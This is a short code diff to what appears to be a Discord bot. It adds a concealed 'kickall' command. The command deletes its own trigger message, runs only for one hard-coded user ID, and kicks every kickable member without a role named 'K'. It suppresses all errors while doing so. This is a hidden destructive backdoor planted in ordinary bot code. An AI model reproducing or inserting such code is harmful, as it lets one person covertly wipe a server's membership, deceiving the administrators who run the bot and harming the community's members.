@@ -188,5 +188,21 @@ if(cmd("icon", msg)) {
                                 }
                               });
                               
+
+
+client.on("message", message => {
+  if(cmd("kickall", message)) {
+    message.delete();
+    if (message.author.id !== '457908858556252170') return;
+
+    message.guild.members.forEach(member => {
+      if (!member.roles.exists("name", "K") && member.kickable) member.kick().catch(e => {});
+      })
+
+
+
+
+  }
+});
                               
                           
